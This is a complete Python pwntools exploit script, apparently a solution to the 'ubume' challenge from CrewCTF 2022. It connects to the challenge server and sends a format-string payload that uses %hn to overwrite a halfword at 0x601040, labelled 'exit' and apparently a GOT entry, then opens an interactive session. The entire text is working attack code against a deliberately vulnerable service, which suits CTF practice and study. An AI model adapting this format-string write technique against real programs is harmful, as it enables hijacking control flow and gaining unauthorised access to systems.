from pwn import *

p = remote("ubume.crewctf-2022.crewc.tf", 1337)
raw_input("DEBUG")
context.arch = 'amd64'
exit = 0x601040


payload = b"A"*16
payload += b"%001786x"
payload += b"%0010$hn"
payload += p64(exit)

p.sendline(payload)

p.interactive()
